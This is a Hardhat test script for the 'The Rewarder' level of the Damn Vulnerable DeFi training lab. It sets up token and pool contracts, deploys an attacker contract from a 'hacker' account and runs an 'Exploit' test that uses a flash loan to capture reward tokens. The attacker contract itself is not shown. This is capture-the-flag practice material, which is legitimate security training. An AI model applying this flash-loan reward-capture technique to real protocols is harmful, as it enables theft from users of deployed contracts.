const{expect} = require("chai");
const{expectRevert} = require("@openzeppelin/test-helpers");


describe("The Rewarder Damn Vulnerable DEFI", function(){

    let owner, account1, account2, account3, hacker,
        AccountingToken, accountingToken, DamnValuableToken, DVT_Token,
        FlashLoanerPool, flashPool, RewardToken, rewardToken, TheRewarderPool, rewarderPool,
        Attacker, attacker;



    before(async()=>{

        [owner, account1, account2, account3, hacker] = await ethers.getSigners();

        //Get RewardTokenContract and AccountingToken Contract.
        RewardToken = await ethers.getContractFactory("RewardToken");
        AccountingToken = await ethers.getContractFactory("AccountingToken");



        //Deploy DamnValuableToken and send 10000 to account1, account2, account3.
        DamnValuableToken = await ethers.getContractFactory("DamnValuableToken");
        DVT_Token = await DamnValuableToken.deploy();
        await DVT_Token.deployed();

        let users = [account1.address, account2.address, account3.address];

        for(let i = 0; i < users.length; i++){
            await DVT_Token.transfer(users[i], ethers.utils.parseEther("10000"));
        }


        for(let i = 0; i < users.length; i++){
            let balanceDVTUsers = await DVT_Token.balanceOf(users[i]);
            console.log(`DVT Balance Account ${i+1} ==> ${(balanceDVTUsers/10**18).toString()} DVT`);
        }
        console.log("");


        //Deploy FlashLoanerPool and send rest of DVT Tokens to it.
        FlashLoanerPool = await ethers.getContractFactory("FlashLoanerPool");
        flashPool = await FlashLoanerPool.deploy(DVT_Token.address);
        await flashPool.deployed();

        let ownerBalanceDVT = await DVT_Token.balanceOf(owner.address);
        await DVT_Token.transfer(flashPool.address, ownerBalanceDVT);



        let DVTBalanceInFlashLoanerPoolContract = await DVT_Token.balanceOf(flashPool.address);
        console.log(
            "DVT Token Balance FlashLoanerPool Contract",
            (DVTBalanceInFlashLoanerPoolContract/10**18).toString(),
            "DVT"
        );
        console.log("")




        //Deploy TheRewarderPool Contract and fetch rewardToken Contract and accountingToken Contract.
        TheRewarderPool = await ethers.getContractFactory("TheRewarderPool");
        rewarderPool = await TheRewarderPool.deploy(DVT_Token.address);
        await rewarderPool.deployed();
        
        rewardToken = await RewardToken.attach(rewarderPool.rewardToken());
        accountingToken = await AccountingToken.attach(rewarderPool.accountingToken());


        let depositors = [account1, account2, account3];

        for(let i = 0; i < depositors.length; i++){
            await DVT_Token.connect(depositors[i]).approve(rewarderPool.address, DVT_Token.balanceOf(users[i]));
            await rewarderPool.connect(depositors[i]).deposit(DVT_Token.balanceOf(users[i]));
        }



        //Deploy the attacker Contract from hacker address and send some ether to perform operations.
        Attacker = await ethers.getContractFactory("AttackerRewarder");
        attacker = await Attacker.connect(hacker).deploy(
            flashPool.address,
            rewarderPool.address,
            DVT_Token.address,
            rewardToken.address
        );
        await attacker.deployed();

        await hacker.sendTransaction({to: attacker.address, value:ethers.utils.parseEther("3")});
    });




    it("Exploit",async()=>{

        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days


        let depositors = [account1, account2, account3];
        let users = [account1.address, account2.address, account3.address];

        await attacker.connect(hacker).callLoan();

        let hackerRewards = await rewardToken.balanceOf(hacker.address)
        console.log("Reward Amount Hacker ==>", (hackerRewards / 10**18).toString(), "rTKN");

        for(let i = 0; i < depositors.length; i++){
            await rewarderPool.connect(depositors[i]).distributeRewards();
            let usersRTokenBalance = await rewardToken.balanceOf(users[i])
            console.log(`Reward Amount Account ${[i+1]} ==> ${(usersRTokenBalance/10**18).toString()}, rTKN`);
        }
    });
})